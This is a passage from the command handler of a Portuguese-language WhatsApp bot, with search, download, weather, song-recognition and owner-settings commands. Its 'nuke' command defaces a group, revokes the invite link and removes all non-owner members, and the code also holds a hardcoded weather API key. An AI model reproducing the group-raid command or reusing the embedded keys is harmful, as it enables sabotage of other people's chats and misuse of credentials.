    }
);

const results = Array.isArray(data?.results) ? data.results : [];

if (!results.length) {
    await reagir(from, "❌");
    return reply("Nenhum resultado encontrado.");
}

// 📦 BAILEYS IMPORTS

const cards = [];

// 🖼️ CARDS
for (let i = 0; i < Math.min(limit, results.length); i++) {

    const img = results[i]?.image_url;
    if (!img) continue;

    const media = await prepareWAMessageMedia(
        { image: { url: img } },
        { upload: conn.waUploadToServer }
    );

    cards.push({
        header: {
            title: `📌 Pinterest • ${query} (${i + 1}/${limit})`,
            hasMediaAttachment: true,
            imageMessage: media.imageMessage
        },
        body: {
            text: "Toque nos botões abaixo 👇"
        },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Abrir imagem",
                        url: img
                    })
                },
                {
                    name: "cta_copy",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Copiar URL",
                        copy_code: img
                    })
                }
            ]
        }
    });
}

// 📤 MESSAGE FINAL
const msg = generateWAMessageFromContent(from, {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                header: { title: "📌 Pinterest Search" },
                body: {
                    text: `🔎 Pesquisa: *${query}*\n🖼️ Resultados: *${cards.length}*`
                },
                footer: {
                    text: `${NomeBot} 🚀`
                },
                carouselMessage: { cards }
            }
        }
    }
}, { userJid: conn.user.id });

// 🚀 ENVIO
await conn.relayMessage(from, msg.message, { messageId: msg.key.id });

// ✅ FINAL
await reagir(from, "✅");

} catch (e) {
console.log("Erro pinterest:", e);

await reagir(from, "❌");
reply("❌ Erro ao buscar imagens no Pinterest.");
}
}
break;

case 'play_video': {
try {
if (!q.trim()) return reply("*_Cadê o nome ou link do YouTube irmão?_*");
await reagir(from, "🔍");
await reply(msg.Download);
await play_video(q, conn, from, info, quoted, ShizukuStile);
await reagir(from, "✅");
} catch (e) {
console.log("❌ ERRO PLAY_VIDEO:", e);
await reagir(from, "❌");
reply(`Erro ao buscar resultados\n\n${e.message}`);
}
}
break;

//DOWNLOADS
case 'suicidio':
case 'sair':
case 'autoexpulsar': {
    await reagir(from, "🚪")

    if (!isGroup) return reply("Só funciona em grupo.");
    if (!isBotGroupAdmins) return reply("Preciso ser admin.");

    await reply(`🚪 ${pushname} pediu pra sair... flw 😂`);

    await sleep(1500)

    await conn.groupParticipantsUpdate(from, [sender], 'remove')
}
break;

case 'ttkdl':
case 'tiktokdl': {
try {
if (!q?.trim()) return reply("*_Cadê o link do vídeo?_*");
if (!/^https?:\/\//i.test(q)) return reply("*_Apenas links_*");

await reply(msg.Download);

await ttkdl(q, conn, from, info, quoted, ShizukuStile, sysite, syskey);

await reagir(from, "✅");
} catch (e) {
console.log("ERRO TTKDL:", e);
await reagir(from, "❌");
reply("❌ Erro ao baixar vídeo!");
}
}
break;

case 'instadl': {
try {
if (!q?.trim()) return reply("*_Cadê o link do vídeo do Instagram?_*");
if (!/^https?:\/\//i.test(q)) return reply("*_Apenas links_*");

await reply(msg.Download);

await instadl(q, conn, from, info, quoted, ShizukuStile);

await reagir(from, "✅");
} catch (e) {
console.log("ERRO INSTADL:", e);
await reagir(from, "❌");
reply("❌ Erro ao baixar vídeo do Instagram!");
}
}
break;

case 'tiktoksearch':
case 'searchtiktok': {
try {
if (!q?.trim()) {
return reply(`⚠️ *ᴇxᴇᴍᴘʟᴏ ᴅᴇ ᴜsᴏ:*\n${prefix + command} mc kevin`);
}

await reagir(from, "🔍");

const qs = require("qs");

const resu = await axios.post(
"https://tikwm.com/api/feed/search",
qs.stringify({
keywords: q,
count: 12,
cursor: 0,
web: 1,
hd: 1
}),
{
headers: {
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
"Accept": "application/json, text/javascript, */*; q=0.01",
"X-Requested-With": "XMLHttpRequest",
"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/130.0.0.0 Mobile Safari/537.36",
"Referer": "https://www.tikwm.com/"
},
timeout: 30000
}
);

const videos = resu.data?.data?.videos;

if (!Array.isArray(videos) || videos.length === 0) {
await reagir(from, "❌");
return reply("❌ *ɴᴇɴʜᴜᴍ ᴠɪ́ᴅᴇᴏ ᴇɴᴄᴏɴᴛʀᴀᴅᴏ*");
}

const data = videos[Math.floor(Math.random() * videos.length)];

const videoUrl = data.play?.startsWith("http")
? data.play
: `https://tikwm.com${data.play}`;

await conn.sendMessage(from, {
video: { url: videoUrl },
caption:
`🎬 *ᴛɪᴋᴛᴏᴋ sᴇᴀʀᴄʜ*

📌 *ᴛɪ́ᴛᴜʟᴏ:* ${data.title || "sᴇᴍ ᴛɪ́ᴛᴜʟᴏ"}
⏱️ *ᴅᴜʀᴀᴄ̧ᴀ̃ᴏ:* ${data.duration || 0}s
👤 *ᴀᴜᴛᴏʀ:* ${data.author?.nickname || "ᴅᴇsᴄᴏɴʜᴇᴄɪᴅᴏ"}`,
mimetype: "video/mp4"
}, { quoted: selo || info });

await reagir(from, "✅");

} catch (e) {
console.log("ERRO TIKTOK SEARCH:", e?.response?.data || e);

await reagir(from, "❌");
reply("❌ *ᴇʀʀᴏ ᴀᴏ ʙᴜsᴄᴀʀ ᴠɪ́ᴅᴇᴏ*");
}
}
break;

case 'clima':
case 'tempo': {
try {

if (!q?.trim()) {
return reply(`🌤️ *Exemplo de uso:*\n${prefix + command} São Paulo`);
}

await reagir(from, "📡");

const clima = await axios.get(
"https://api.openweathermap.org/data/2.5/weather",
{
params: {
q: q.trim(),
appid: "0a508eeaddd38789f71bbe60e8db7245",
units: "metric",
lang: "pt_br"
},
timeout: 20000,
validateStatus: () => true
}
);

if (clima.status !== 200 || clima.data?.cod != 200) {
await reagir(from, "❌");
return reply("❌ Cidade não encontrada.");
}

const d = clima.data;

const texto = `🌤️ *CLIMA ATUAL*

🏙️ *Cidade:* ${d.name}, ${d.sys.country}
🌡️ *Temperatura:* ${Math.round(d.main.temp)}°C
🔥 *Máxima:* ${Math.round(d.main.temp_max)}°C
❄️ *Mínima:* ${Math.round(d.main.temp_min)}°C
🤗 *Sensação:* ${Math.round(d.main.feels_like)}°C
🌦️ *Clima:* ${d.weather[0].description}
💧 *Umidade:* ${d.main.humidity}%
🌬️ *Vento:* ${d.wind.speed} m/s
📊 *Pressão:* ${d.main.pressure} hPa

👤 *Solicitado por:* ${pushname}`;

await conn.sendMessage(from, {
text: texto
}, { quoted: selo || info });

await reagir(from, "✅");

} catch (e) {
console.log("ERRO CLIMA:", e.response?.data || e);

await reagir(from, "❌");

if (e.response?.status === 401) {
return reply("❌ API Key inválida ou ainda não foi ativada.");
}

reply("❌ Erro ao consultar o clima.");
}
}
break;

case 'nuke': {
try {

// 🔒 PERMISSÕES
if (!So_Dono) return reply("❌ Apenas meu dono pode usar isso.");
if (!isGroup) return reply("❌ Apenas em grupos.");
if (!isBotGroupAdmins) return reply("❌ Preciso ser admin.");

// ⚠️ REAÇÃO
await reagir(from, "💣");

// 📝 ALTERAR NOME/DESC
await conn.groupUpdateSubject(from, `ARQUIVED BY: ${NickDono}`);
await conn.groupUpdateDescription(from, `Another one for my collection of archived groups 🤷‍♂️\nby ${NickDono}`);

// 🔗 RESET LINK
await conn.groupRevokeInvite(from);

// 📊 METADATA
const groupMetadata = await getGroupMetadataCached(conn, from);
const groupMembers = groupMetadata.participants.map(i => i.id).filter(Boolean);

// 👑 IDs IMPORTANTES
const groupOwnerId = groupMetadata.owner || "";
const donosFixos = [
`${NumberDono}@s.whatsapp.net`,
`${dono1}@s.whatsapp.net`,
`${dono2}@s.whatsapp.net`,
`${dono3}@s.whatsapp.net`,
`${dono4}@s.whatsapp.net`,
`${dono5}@s.whatsapp.net`,
`${dono6}@s.whatsapp.net`
];

// 🚫 NÃO REMOVER
const botId = conn.user.id;

// 🎯 FILTRAR MEMBROS
const membersToRemove = groupMembers.filter(id =>
id !== botId &&
id !== groupOwnerId &&
!donosFixos.includes(id)
);

// ❌ NADA PRA REMOVER
if (membersToRemove.length === 0) {
await reagir(from, "⚠️");
return reply("*Não há ninguém para remover.*");
}

// ⚡ AVISO
await conn.sendMessage(from, {
text: `💣 *NUKE ATIVADO*

Removendo ${membersToRemove.length} membros...`
}, { quoted: selo });

// ⏳ PEQUENO DELAY
await new Promise(r => setTimeout(r, 1000));

// 🚀 REMOVER TODOS
await conn.groupParticipantsUpdate(from, membersToRemove, 'remove');

// ✅ FINAL
await reagir(from, "🔥");

} catch (e) {
console.error("Erro nuke:", e);

await reagir(from, "❌");
reply("❌ Erro ao executar nuke.");
}
}
break;

case 'shazam':
case 'reconhecermusica': {
try {
    const FormData = require('form-data');

    const texto = q || args.join(' ') || '';
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted ? (quoted.mimetype || quoted.msg?.mimetype || '') : '';
    const isMedia = /audio|video/.test(mime);

    if (!texto && !isMedia) {
        return reply(`╭━━〔 🎵 𝗦𝗛𝗔𝗭𝗔𝗠 〕━━⬣
┃ Use:
┃ ${prefix + command} link
┃
┃ Ou responda um áudio/vídeo
╰━━━━━━━━━━━━━━⬣`);
    }

    await conn.sendMessage(from, {
        react: { text: '⏳', key: m.key }
    });

    let payload;
    let headers = {};

    if (isMedia) {
        const buffer = await quoted.download();

        if (!buffer) {
            throw new Error('Não consegui baixar essa mídia.');
        }

        const form = new FormData();

        form.append('audio', buffer, {
            filename: 'audio.mp3',
            contentType: 'audio/mpeg'
        });

        payload = form;
        headers = form.getHeaders();
    } else {
        payload = { url: texto };
    }

    const { data } = await axios.post(
    'https://zone.api.br/api/shazam?apikey=API_KEY_SYSTEM',
    payload,
    {
        headers,
        timeout: 60000
    }
);

    if (!data?.status || !data?.identified || !data?.result) {
        throw new Error('Música não identificada.');
    }

    const r = data.result;

    let txt = `╭━━〔 🎵 𝗦𝗛𝗔𝗭𝗔𝗠 〕━━⬣\n`;
    txt += `┃ 🎧 *Título:* ${r.title || 'Não encontrado'}\n`;
    txt += `┃ 👤 *Artista:* ${r.artist || 'Não encontrado'}\n`;

    if (r.album) txt += `┃ 💿 *Álbum:* ${r.album}\n`;
    if (r.release_date) txt += `┃ 📅 *Lançamento:* ${r.release_date}\n`;
    if (r.genre) txt += `┃ 🎼 *Gênero:* ${r.genre}\n`;

    if (r.youtube) {
        txt += `┃\n`;
        txt += `┣━━〔 ▶️ 𝗬𝗢𝗨𝗧𝗨𝗕𝗘 〕━━⬣\n`;
        if (r.youtube.author) txt += `┃ 📺 *Canal:* ${r.youtube.author}\n`;
        if (r.youtube.views) txt += `┃ 👁️ *Views:* ${Number(r.youtube.views).toLocaleString('pt-BR')}\n`;
        if (r.youtube.duration) txt += `┃ ⏱️ *Duração:* ${r.youtube.duration}\n`;
        if (r.youtube.url) txt += `┃ 🔗 *Link:* ${r.youtube.url}\n`;
    }

    if (r.links?.spotify) txt += `┃\n┃ 🟢 *Spotify:* ${r.links.spotify}\n`;
    if (r.links?.apple_music) txt += `┃ 🍎 *Apple Music:* ${r.links.apple_music}\n`;

    txt += `╰━━━━━━━━━━━━━━⬣`;

    const buttons = [];

    if (r.links?.spotify) {
        buttons.push({
            name: 'cta_url',
            buttonParamsJson: JSON.stringify({
                display_text: 'Spotify',
                url: r.links.spotify
            })
        });
    }

    if (r.youtube?.url) {
        buttons.push({
            name: 'cta_url',
            buttonParamsJson: JSON.stringify({
                display_text: 'YouTube',
                url: r.youtube.url
            })
        });

        buttons.push({
            name: 'cta_copy',
            buttonParamsJson: JSON.stringify({
                display_text: 'Copiar YouTube',
                copy_code: r.youtube.url
            })
        });
    }

    if (r.links?.apple_music) {
        buttons.push({
            name: 'cta_url',
            buttonParamsJson: JSON.stringify({
                display_text: 'Apple Music',
                url: r.links.apple_music
            })
        });
    }

    let header = {};

    if (r.media?.image) {
        const media = await prepareWAMessageMedia(
            { image: { url: r.media.image } },
            { upload: conn.waUploadToServer }
        );

        header = {
            hasMediaAttachment: true,
            imageMessage: media.imageMessage
        };
    }

    if (buttons.length > 0) {
        const msg = generateWAMessageFromContent(from, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: txt },
                        footer: { text: 'KYARA MD ❤️‍🔥' },
                        header,
                        nativeFlowMessage: {
                            buttons
                        }
                    }
                }
            }
        }, {
            quoted: m
        });

        await conn.relayMessage(from, msg.message, {
            messageId: msg.key.id
        });
    } else {
        if (r.media?.image) {
            await conn.sendMessage(from, {
                image: { url: r.media.image },
                caption: txt
            }, { quoted: m });
        } else {
            reply(txt);
        }
    }

    if (r.media?.preview) {
        await conn.sendMessage(from, {
            audio: { url: r.media.preview },
            mimetype: 'audio/mpeg',
            ptt: false
        }, { quoted: m });
    }

    await conn.sendMessage(from, {
        react: { text: '✅', key: m.key }
    });

} catch (e) {
    console.log('[ERRO SHAZAM]', e?.response?.data || e?.message || e);

    await conn.sendMessage(from, {
        react: { text: '❌', key: m.key }
    });

    reply(`❌ Não consegui identificar essa música.`);
}
}
break;
    
//METADINHAS
case 'metadinhas': {await reagir(from, "🧑‍🤝‍🧑");
try {await METADINHAS(conn, from, info,quoted, SHIZUKU_KEY, SHIZUKU_SITE);
} catch (e) {reply("Error..") }
} break 

//COMANDOS DE DONO!!
case 'setprefix':
if (!So_Dono) return reply(msg.SoDono);
if (!q) return reply("Digite o novo prefixo. Ex: *!setprefix .*");
const novoPrefix = q.trim();
Config.prefix = novoPrefix;
fs.writeFileSync("./dono/dono.json", JSON.stringify(Config, null, 4));
reply(`✔ Prefixo alterado para: *${novoPrefix}*`);
break;

case 'nick-dono':
if (!So_Dono) return reply(msg.SoDono);
const novaNick = q.trim();
Config.NickDono = novaNick;
fs.writeFileSync("./dono/dono.json", JSON.stringify(Config, null, 4));
reply(`✔ Nick do dono alterado para: *${novaNick}*`);
break;

case 'nome-bot':
if (!So_Dono) return reply(msg.SoDono);
const novoNome = q.trim();
Config.NomeBot = novoNome;
fs.writeFileSync("./dono/dono.json", JSON.stringify(Config, null, 4));
reply(`✔ Nome do bot alterado para: *${novoNome}*`);
break;

case 'novo-dono':
if (!So_Dono) return reply(msg.SoDono);
if (!q && !menc_os2) return reply("Digite o novo número do dono. Ex: *!setdono 551199999999*");
const novoDn = q.split("@")[0] || menc_os2.split("@")[0];
if (novoDn.length < 10) return reply("Número inválido.");
const novoDono = novoDn;
Config.NumberDono = novoDono;
fs.writeFileSync("./dono/dono.json", JSON.stringify(Config, null, 4));
reply(`✔ *Número do dono atualizado!*\nNovo dono: wa.me/${novoDono}`);
break;

case 'dono1':
if (!So_Dono) return reply(msg.SoDono);
if (!q && !menc_os2) return reply("Digite o novo número do dono. Ex: *!dono1 551199999999*");
const novodn1 = q.split("@")[0] || menc_os2.split("@")[0];
if (novodn1.length < 10) return reply("Número inválido.");
const Dono1 = novodn1;
Config2.dono1 = Dono1;
fs.writeFileSync("./dono/dados-donos.json", JSON.stringify(Config2, null, 4));
reply(`✔ *Pronto mestre!*\n${NomeBot} agora tem um novo dono!\n\n👑 Dono 1: wa.me/${Dono1}`);
break;


case 'dono2':
if (!So_Dono) return reply(msg.SoDono);
if (!q && !menc_os2) return reply("Digite o novo número do dono. Ex: *!dono2 551199999999*");
const novodn2 = q.split("@")[0] || menc_os2.split("@")[0];
if (novodn2.length < 10) return reply("Número inválido.");
const Dono2 = novodn2;
Config2.dono2 = Dono2;
fs.writeFileSync("./dono/dados-donos.json", JSON.stringify(Config2, null, 4));
reply(`✔ *Número do dono atualizado!*\n\n👑 Dono 2: wa.me/${Dono2}`);
break;


case 'dono3':
if (!So_Dono) return reply(msg.SoDono);
if (!q && !menc_os2) return reply("Digite o novo número do dono. Ex: *!dono3 551199999999*");
const novodn3 = q.split("@")[0] || menc_os2.split("@")[0];
if (novodn3.length < 10) return reply("Número inválido.");
const Dono3 = novodn3;
Config2.dono3 = Dono3;
fs.writeFileSync("./dono/dados-donos.json", JSON.stringify(Config2, null, 4));
reply(`✔ *Número do dono atualizado!*\n\n👑 Dono 3: wa.me/${Dono3}`);
break;


case 'dono4':
if (!So_Dono) return reply(msg.SoDono);
if (!q && !menc_os2) return reply("Digite o novo número do dono. Ex: *!dono4 551199999999*");
const novodn4 = q.split("@")[0] || menc_os2.split("@")[0];
if (novodn4.length < 10) return reply("Número inválido.");
const Dono4 = novodn4;
Config2.dono4 = Dono4;
fs.writeFileSync("./dono/dados-donos.json", JSON.stringify(Config2, null, 4));
reply(`✔ *Número do dono atualizado!*\n\n👑 Dono 4: wa.me/${Dono4}`);
break;


case 'dono5':
if (!So_Dono) return reply(msg.SoDono);
if (!q && !menc_os2) return reply("Digite o novo número do dono. Ex: *!dono5 551199999999*");
const novodn5 = q.split("@")[0] || menc_os2.split("@")[0];
if (novodn5.length < 10) return reply("Número inválido.");
const Dono5 = novodn5;
Config2.dono5 = Dono5;
fs.writeFileSync("./dono/dados-donos.json", JSON.stringify(Config2, null, 4));
reply(`✔ *Número do dono atualizado!*\n\n👑 Dono 5: wa.me/${Dono5}`);
break;


case 'dono6':
if (!So_Dono) return reply(msg.SoDono);
if (!q && !menc_os2) return reply("Digite o novo número do dono. Ex: *!dono6 5519995729970*");
const novodn6 = q.split("@")[0] || menc_os2.split("@")[0];
if (novodn6.length < 10) return reply("Número inválido.");
const Dono6 = novodn6;
Config2.dono6 = Dono6;
fs.writeFileSync("./dono/dados-donos.json", JSON.stringify(Config2, null, 4));
reply(`✔ *Número do dono atualizado!*\n\n👑 Dono 6: wa.me/${Dono6}`);
break;

case 'botoff':
case 'boton': {
if(!So_Dono) return reply(msg.SoDono);
if(command === 'botoff') {
if (BotOff === true) return reply(`❌ *${NomeBot} já está DESLIGADO, mestre...*`);
Config2.botoff = true;
fs.writeFileSync("./dono/dados-donos.json", JSON.stringify(Config2, null, 4));
return reply(
`⛔ *SISTEMA DESATIVADO*

✅ Somente você poderá usar meus comandos agora.
🕸️ *Kyara entrou no modo Stealth...*`);
}
if(command === 'boton') {
if(BotOff === false) return reply(`⚠️ *${NomeBot} já está ATIVO, mestre!*`);
Config2.botoff = false;
fs.writeFileSync("./dono/dados-donos.json", JSON.stringify(Config2, null, 4));
return reply(
`✅ *SISTEMA REATIVADO*

❤️‍🔥 Todos os usuários agora podem usar meus comandos novamente.
🔥 *Kyara voltou ao centro de operação!*`);
}
}
break;


case 'bangp':
case 'unbangp':
if(!isGroup) return reply(msg.SoEmGrupo)
if(!So_Dono) return reply(msg.SoDono)
if(command == 'bangp'){
if(isBanGrupo) return reply(`Este grupo já está banido.`)
dataGp[0].bangp = true
setGp(dataGp)
reply(`Grupo banido com sucesso`)
} else {
if(!isBanGrupo) return reply(`Este grupo não está mais banido.`)
dataGp[0].bangp = false
setGp(dataGp)
reply(`Grupo desbanido...`)
}
break;

case 'reiniciar':
case 'restart':
case 'r': {
try {
if (!So_Dono) return reply(msg.SoDono);

await reagir(from, "🔄");

await reply(`🔄 *Reiniciando o Kyara...*

⏳ Aguarde alguns segundos.`);

// Aguarda 1 segundo para a mensagem ser enviada
await new Promise(resolve => setTimeout(resolve, 1000));

process.exit(0);

} catch (e) {
console.log(e);
reply("❌ Erro ao reiniciar o bot.");
}
}
break;

case 'donos':
case 'listadonos': {
let texto = `🌌 *LISTA OFICIAL DE DONOS — ${NomeBot}* ❄️

╭━━━━━━━━━━━〔 🔥 DONO PRINCIPAL 🔥 〕━━━━━━━━━━━━╮
┃
┃ 👑 ${NickDono}
┃ 📞 wa.me/${NumberDono}                                
┃ 🌐 Site oficial: https://
┃ 📞 Número comercial: https://wa.me/message/FO4NMGVGHVUCI1
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

👑 *Donos Adicionais:*`;

let donos = [
  Config2?.dono1,
  Config2?.dono2,
  Config2?.dono3,
  Config2?.dono4,
  Config2?.dono5,
  Config2?.dono6
];

donos.forEach((dono, i) => {
  if(dono && dono !== "undefined" && dono !== "") {
    texto += `\n👑 Dono ${i+1}: wa.me/${dono}`;
  }
});

texto += `

━━━━━━━━━━━━━━━━━━
> *${NomeBot}: Quero matar o Kyara </>* 🔥
`;

conn?.sendMessage(from, {image: FotoMenu, caption: texto}, {quoted: info});
}
break;

case 'verificado':
if(!So_Dono) return reply(msg.SoDono)
if(!isVerificado) {
Config2.verificado = true
fs.writeFileSync("./dono/dados-donos.json", JSON.stringify(Config2, null, 4));
reply(`O verificado foi Ativado`)
} else if(isVerificado) {
Config2.verificado = false
fs.writeFileSync("./dono/dados-donos.json", JSON.stringify(Config2, null, 4));
reply(`O verificado foi Desativado`)
}
break

case 'totalcases':
try {
const fileContent = fs.readFileSync("index.js").toString();
const caseNames = fileContent.match(/case\s+'(.+?)'/g);
const cont = caseNames.length;
await reply(`${cont}`)
} catch (error) {
console.log(error)
reply("Erro ao obter o total de comandos");
}
break;

case 'cases':
if(!So_Dono) return reply("Você não é dono para utilizar este comando...")
try {
const listCases = () => {
const fileContent = fs.readFileSync("index.js").toString();
const caseNames = fileContent.match(/case\s+'(.+?)'/g);
if (caseNames) {
return caseNames.map((caseName, index) => `${index + 1}. ${caseName.match(/'(.+?)'/)[1]}`).join('\n');
} else {
reply("Nenhuma case encontrada.") } }
conn.sendMessage(from, { text: listCases() }, { quoted: selo });
} catch (e) {
console.log(e)
reply('Ocorreu um erro ao obter as cases.') }
break

case 'getcase': {
  if (!So_Dono) return reply('❌ Apenas o dono pode usar.')

  if (!q) {
    return reply(`❌ Exemplo:
${prefix + command} menu`)
  }

  try {

    const path = './index.js'
    const data = fs.readFileSync(path, 'utf8')

    const regex = new RegExp(
      `case ['"]${q}['"]:(.*?)break`,
      'gs'
    )

    const match = regex.exec(data)

    if (!match) {
      return reply('❌ Case não encontrada.')
    }

    return reply(`${match[0]}break`)

  } catch (e) {
    console.log('❌ Erro no getcase:', e)
    return reply('❌ Erro ao pegar a case.')
  }
}
break;


//OUTROS COMANDOS INFORMATIVOS 
case 'ping': {
try {
const os = require('os')

const msgPing = await conn.sendMessage(from, {
text: `🏓 *PING*

██░░░░░░░░░░ 17%
⏳ Conectando...`
}, { quoted: selo })

const key = msgPing.key

const frames = [
['██░░░░░░░░░░ 17%', '⏳ Conectando...'],
['████░░░░░░░░ 33%', '⏳ Coletando dados...'],
['██████░░░░░░ 50%', '⏳ Analisando sistema...'],
['████████░░░░ 67%', '⏳ Calculando RAM...'],
['██████████░░ 83%', '⏳ Gerando resultado...'],
['████████████ 100%', '✅ Concluído!']
]

for (const [barra, status] of frames) {
await new Promise(r => setTimeout(r, 250))
await conn.sendMessage(from, {
text: `🏓 *PING*

${barra}
${status}`,
edit: key
})
}

const uptime = process.uptime()
const r = (Date.now() / 1000) - info.messageTimestamp

const totalMem = os.totalmem()
const freeMem = os.freemem()
const usedMem = totalMem - freeMem
const usedPercent = (usedMem / totalMem) * 100

const totalRamGB = (totalMem / 1024 / 1024 / 1024).toFixed(2)
const freeRamGB = (freeMem / 1024 / 1024 / 1024).toFixed(2)
const usedRamGB = (usedMem / 1024 / 1024 / 1024).toFixed(2)

// ✅ TABELA AIRich
await conn.sendRich(from, [
conn.makeText('🏓 # STATUS PING - KYARA AI'),

conn.makeTable([
['Info', 'Valor'],
['👤 Usuário', pushname],
['⏰ Online', kyun(uptime)],
['⚡ Velocidade', `${r.toFixed(3)}s`],
['📊 RAM Total', `${totalRamGB} GB`],
['📉 RAM Usada', `${usedRamGB} GB`],
['📈 RAM Livre', `${freeRamGB} GB`],
['🧾 Uso Sistema', `${usedPercent.toFixed(1)}%`],
['🟢 Status', 'Online']
])
], selo, ['RICH_RESPONSE_TABLE'])

// ✅ BOTÕES SEPARADOS
const media = await prepareWAMessageMedia(
{ image: FotoMenu },
{ upload: conn.waUploadToServer }
)

const botoes = [
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "🔁 Atualizar",
id: `${prefix}ping`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "📋 Menu",
id: `${prefix}menu`
})
}
]

const card = {
header: {
hasMediaAttachment: true,
imageMessage: media.imageMessage
},
headerType: "IMAGE",
body: {
text: "Escolha uma opção abaixo:"
},
footer: {
text: "Kyara & Kyara-AI ❤️‍🔥"
},
nativeFlowMessage: {
buttons: botoes
}
}

await conn.relayMessage(from, {
interactiveMessage: {
carouselMessage: {
cards: [card]
}
}
}, { quoted: selo })

} catch (e) {
console.log(e)
reply("❌ Erro ao mostrar o ping.")
}
}
break;

//SEGURANÇA 

case 'antilink': {
try {

if (!isGroup) return reply('❌ Apenas em grupos!');
if (!isGroupAdmins) return reply('❌ Apenas administradores!');
if (!q) return reply(`Use:\n${prefix}antilink on\n${prefix}antilink off`);

if (!dataGp[0].antilink) dataGp[0].antilink = false;

if (q.toLowerCase() === 'on') {

dataGp[0].antilink = true;
setGp(dataGp);

await reagir(from, "✅");
reply('🛡️ AntiLink ativado com sucesso!');

} else if (q.toLowerCase() === 'off') {

dataGp[0].antilink = false;
setGp(dataGp);

await reagir(from, "❌");
reply('🔓 AntiLink desativado com sucesso!');

} else {
reply(`Use:\n${prefix}antilink on\n${prefix}antilink off`);
}

} catch (e) {
console.log(e);
reply('❌ Erro ao configurar o AntiLink.');
}
}
break;

//PLAQUINHAS 
case 'plaq1':
case 'plaq2':
case 'plaq3':
case 'plaq4':
case 'plaq5':
case 'plaq6':
case 'plaq7':
case 'plaq8':
case 'plaq9':
case 'plaq10':
case 'plaq11':
case 'plaq12':
case 'plaq13':
case 'plaq14':
case 'plaq15':
case 'plaq16':
case 'plaq17':
case 'plaq18':
case 'plaq19':
case 'plaq20': {
try {

const placas = {
plaq1: {
tipo: 'image',
url: 'https://media-buddy-share.lovable.app/api/public/media/be1882a1-42b1-402a-9038-f45b861d255b.png?key=mh_1eddfd94395a4147b21f574ed79962f8a4defeaef86447379519470a454ea950'
},
plaq2: {
tipo: 'image',
url: 'https://media-buddy-share.lovable.app/api/public/media/b7a49250-432d-4ea2-9909-c5d718c27120.png?key=mh_1eddfd94395a4147b21f574ed79962f8a4defeaef86447379519470a454ea950'
},
plaq3: {
tipo: 'image',
url: 'https://media-buddy-share.lovable.app/api/public/media/1b78986e-ea0d-4372-96eb-ea2cc8ba4084.png?key=mh_1eddfd94395a4147b21f574ed79962f8a4defeaef86447379519470a454ea950'
},
plaq4: {
tipo: 'image',
url: 'https://media-buddy-share.lovable.app/api/public/media/49015cb4-4c5e-4cf8-a85f-d8e4fdead0d4.png?key=mh_1eddfd94395a4147b21f574ed79962f8a4defeaef86447379519470a454ea950'
},
plaq5: {
tipo: 'image',
url: 'https://media-buddy-share.lovable.app/api/public/media/74a3e51f-f87c-47e2-8f85-87158c0f2a1c.png?key=mh_1eddfd94395a4147b21f574ed79962f8a4defeaef86447379519470a454ea950'
},
plaq6: {
tipo: 'image',
url: 'https://media-buddy-share.lovable.app/api/public/media/90fe35ed-b82b-4122-9f8a-8f45558c8364.png?key=mh_1eddfd94395a4147b21f574ed79962f8a4defeaef86447379519470a454ea950'
},
plaq7: {
tipo: 'image',
url: 'https://media-buddy-share.lovable.app/api/public/media/e887a2c9-8c4e-4aa2-a8fb-0723d2cc777c.png?key=mh_1eddfd94395a4147b21f574ed79962f8a4defeaef86447379519470a454ea950'
},
plaq8: {
tipo: 'image',
url: 'https://media-buddy-share.lovable.app/api/public/media/e8bd86da-a7da-4879-ae35-ee72f5c6f4dc.png?key=mh_1eddfd94395a4147b21f574ed79962f8a4defeaef86447379519470a454ea950'
},
plaq9: {
tipo: 'image',
url: 'https://media-buddy-share.lovable.app/api/public/media/4f94706d-70ba-4c02-9a03-58f127fe0482.png?key=mh_1eddfd94395a4147b21f574ed79962f8a4defeaef86447379519470a454ea950'
},
plaq10: {
tipo: 'image',
url: 'https://media-buddy-share.lovable.app/api/public/media/aef5e9cf-aaed-4980-b520-19e3a2488786.png?key=mh_1eddfd94395a4147b21f574ed79962f8a4defeaef86447379519470a454ea950'
},
plaq11: {
tipo: 'video',
url: 'https://files.catbox.moe/s571ur.mp4'
},
plaq12: {
tipo: 'video',
url: 'https://files.catbox.moe/6f82jh.mp4'
},
plaq13: {
tipo: 'video',
url: 'https://files.catbox.moe/iuumnm.mp4'
},
plaq14: {
tipo: 'video',
url: 'https://files.catbox.moe/6zkgky.mp4'
},
plaq15: {
tipo: 'video',
url: 'https://files.catbox.moe/dps8rm.mp4'
},
plaq16: {
tipo: 'gif',
url: 'https://files.catbox.moe/kkvy0w.mp4'
},
plaq17: {
tipo: 'gif',
url: 'https://files.catbox.moe/uaulwg.mp4'
},
plaq18: {
tipo: 'gif',
url: 'https://files.catbox.moe/eht2vm.mp4'
},
plaq19: {
tipo: 'gif',
url: 'https://files.catbox.moe/6qnwe4.mp4'
},
plaq20: {
tipo: 'gif',
url: ''
}
};

const media = placas[command];

if (!media) return reply('❌ Arquivo não encontrado.');

if (media.tipo === 'image') {
    await conn.sendMessage(sender, {
        image: { url: media.url },
        caption: '😏 *Tá aqui sua foto, safadinho(a)!*\n\n❤️‍🔥 Enviado exclusivamente no seu privado.'
    });

} else if (media.tipo === 'video') {
    await conn.sendMessage(sender, {
        video: { url: media.url },
        caption: '😏 *Tá aqui seu vídeo, safadinho(a)!*\n\n❤️‍🔥 Enviado exclusivamente no seu privado.'
    });

} else if (media.tipo === 'gif') {
    await conn.sendMessage(sender, {
        video: { url: media.url },
        gifPlayback: true,
        caption: '😏 *Tá aqui seu GIF, safadinho(a)!*\n\n❤️‍🔥 Enviado exclusivamente no seu privado.'
    });
}

reply('📩 *Mídia enviada no seu privado!*');

} catch (e) {
console.log('ERRO PLAQ:', e);
reply('❌ Não consegui enviar a mídia no seu privado.');
}
}
break;

//FIGURINHAS 
case 'figu_raiva':
case 'figu_roblox':
case 'figu_engracada':
case 'figu_memes':
case 'figu_anime':
case 'figu_coreana':
case 'figu_bebe':
case 'figu_desenho':
case 'figu_animais':
